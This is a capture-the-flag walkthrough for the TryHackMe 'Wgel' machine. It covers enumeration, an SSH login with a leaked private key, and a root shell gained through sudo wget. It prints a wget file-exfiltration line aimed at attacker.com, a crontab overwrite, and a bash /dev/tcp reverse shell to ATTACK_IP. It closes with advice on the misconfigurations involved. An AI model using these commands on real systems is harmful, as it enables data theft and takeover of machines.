# Try Hack Me - Wgel CTF

**Categories:**  Security  
**Difficulty:** Easy  

All of the commands used in this guide use the exported variable $IP (`export IP=10.10.249.175`) in place of the target machine's IP address.

## 1: Enumeration - nmap, gobuster

Having launched the machine, we perform a basic service enumeration scan with nmap :

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -oN nmap.out $IP
```

The scan shows 2 open ports : 22 (OpenSSH 7.2p2) and 80 (Apache httpd 2.4.18) :

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

curling the application hosted on port 80 returns a default Apache2 configuration page with a single change, a comment for a user jessie (a visual clue on the rendered page is the large gap between the final line in the config list - hard to spot, I know) :

```html
<p>
    The configuration layout for an Apache2 web server installation on Ubuntu systems is as follows:
</p>
<pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf


 <!-- Jessie don't forget to udate the webiste -->
</pre>
```

This isn't much use on its own, so we continue with gobuster using dirbuster's common wordlist (some trial and error might be required here before you stumble across the right wordlist) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ gobuster dir -u $IP -w /usr/share/dirb/wordlists/common.txt
...snip...
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 277]  
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.204.48/sitemap/]
```
Navigating to the `/sitemap/` route shows a [wordpress template Unapp provided by colorlib.com](https://colorlib.com/wp/template/unapp/). We can repeat the same gobuster scan used above on the newly discovered `/sitemap/` route :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ gobuster dir -u $IP/sitemap/ -w /usr/share/dirb/wordlists/common.txt
...snip...
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.204.48/sitemap/.ssh/]
...snip...
```

curling `/sitemap/.ssh` shows a directory containing a file `id_rsa` and, sure enough, curling `/sitemap/.ssh/id_rsa` reveals a private key :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ curl $IP/sitemap/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
...snip...
```

## 2: Foothold - private key

We download the private key with curl, set appropriate permissions on the key for connection with ssh, and attempt to connect using the discovered username "jessie" :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ curl $IP/sitemap/.ssh/id_rsa > id_rsa 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1675  100  1675    0     0   8091      0 --:--:-- --:--:-- --:--:--  8091

┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ ssh jessie@$IP -i id_rsa 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
...snip..
jessie@CorpOne:~$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
The user flag is at `/home/jessie/Documents/user_flag.txt`.


## 3: Privesc - wget, crontab, root shell

We've already seen with `id` that the jessie user is a member of the sudo group, and running `sudo -l` shows that they can run `wget` as sudo without a password :

```console
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Assuming that we already know the path of the target file, `wget` offers a number of options for file read and file upload. With `sudo` access, we can therefore read and extract any file on the system. [GTFObins gives the following two examples](https://gtfobins.github.io/gtfobins/wget/) of file upload and file read actions with `wget` :

File upload via a POST request of a known file : 

```console
URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
```

File read as URL input (`-i` flag), with each line printed to the console as an error as name resolution fails for the content of the line:

```console
LFILE=file_to_read
wget -i $LFILE
```

This is good enough to get the root flag (assuming we know that the root flag is at /root/root_flag.txt - which it is). But we can also use `wget`'s file write feature to provide a root shell by overwriting `/etc/crontab`. For this to work, we first need to check that `cron` is running on the target machine :

```console
jessie@CorpOne:~/Documents$ systemctl status cron
● cron.service - Regular background program processing daemon
   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabl
   Active: active (running) since Ma 2021-09-07 04:55:46 EEST; 29min ago
     Docs: man:cron(8)
    ..snip...
```

Perfect. The plan is to create a copy of the existing `/etc/crontab` file that adds a new job that is run as root. We can then host this copy on the attack machine, download it to the target machine with `wget` as sudo, and overwrite the existing `/etc/crontab` file (the new job will be applied automatically without requiring a restart of the `cron` service).

Let's start with a proof of concept - here, we copy `/etc/crontab` from the target machine and add a new root job that creates a file in `/home/jessie` (I have no idea how fragile the syntax of the `/etc/crontab` file is - i've just made an effort to respect the whitespace etc. of the existing jobs) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ cat crontab-poc
# /etc/crontab: system-wide crontab
...snip...
* *    * * *   root    touch /home/jessie/poc.txt
```

We then host `crontab-poc` on the attack machine and download it to the target machine with `sudo wget`, overwriting the existing `/etc/crontab` file :

```console
jessie@CorpOne:~/Documents$ sudo wget ATTACK_IP/crontab-poc -O /etc/crontab
--2021-09-07 05:32:41--  http://ATTACK_IP/crontab-poc
Connecting to ATTACK_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 802 [application/octet-stream]
Saving to: ‘/etc/crontab’

/etc/crontab                        100%[================================================================>]     802  --.-KB/s    in 0s

2021-09-07 05:32:41 (117 MB/s) - ‘/etc/crontab’ saved [802/802]
```
After a minute or so, we see the poc file in `/home/jessie`, owned by root :

```console
jessie@CorpOne:~$ ls -l | grep poc
-rw-r--r-- 1 root   root      0 sep  7 05:34 poc.txt
```

To translate our proof of concept into a root shell, we create a simple bash reverse shell at `/home/jessie/rs.sh` :

```console
jessie@CorpOne:~$ cat rs.sh
#!/bin/bash

bash -i >& /dev/tcp/ATTACK_IP/4242 0>&1
```

We then adapt `cronjob-poc` to execute the `rs.sh` script :

```console
┌──(kali㉿kali)-[~/Documents/tthm/wgel]
└─$ cat crontab-poc
# /etc/crontab: system-wide crontab
...snip..
* *    * * *   root    bash /home/jessie/rs.sh
```

and we start a netcat listener on the attack machine and repeat the same sequence as before : host `crontab-poc` on the attacker machine and download with `sudo wget` on the target machine overwriting `/etc/crontab`. After a minute or so, the reverse shell connects :

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [ATTACK_IP] from (UNKNOWN) [10.10.204.48] 55606
bash: cannot set terminal process group (1989): Inappropriate ioctl for device
bash: no job control in this shell
root@CorpOne:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root_flag.txt`

## 4: Summary and Solutions

Information disclosed in a test version of a website provided us with a foothold, and excessive permissions on a well-known, built-in binary gaves us a root shell. So what exactly went wrong here?

1. A test version of a website, including comments between developers, ended up being hosted publicly, leading to information disclosure (username). Either the production version of the site was not properly vetted prior to release, or the test version was published accidentally.
2. The site provided access to files on the system, leading to information disclosure (private RSA keys!). This is either due to a misconfiguration (hosting the site from ~, for some reason), or another test artefact ("if you need the keys to the test box, they're in a hidden folder on the site...").
3. `wget` can perform read and write operations on the system, and with sudo rights can perform read and write operations on any file on the system. Combined with the running `cron` service, this allows for arbitrary code execution on the machine as root.

And what could be done differently?

1. Public hosting of a test site is never required. Containerisation, hosting on local interfaces and deployment in a LAN or VPN are all safe options for realistic testing without public hosting. It is possible that the exposure of the site on a public facing interface was accidental - to avoid these accidents, install a firewall on the test box that blocks all incoming traffic on 80 and 443.

   Additionally, code should never be used for communication between developers. While code should be vetted for potential information disclosure prior to production deployment, these kind of comments ("Jessie, don't forget to...") should never get past the code review / merge stage.
2. Most HTTP server misconfiguration errors can be avoided by following default configuration guidelines - hosting the site from the default location, under the default user, etc. If the exposure of the `.ssh/id_rsa` file is not due to a root directory misconfiguration, then we can presume a user has deliberately hosted the key to allow access to the test box - a conversation about access controls is probably in order.
3. The principle of least privilege should always be applied when scoping user permissions and is especially important for sudo group members. We saw that sudo access to `wget` provides global read and write access on the system. Be aware of how binaries can interact with the system with elevated privileges, and bear this in mind when scoping permissions. [GTFOBins](https://gtfobins.github.io/) is a good place to start.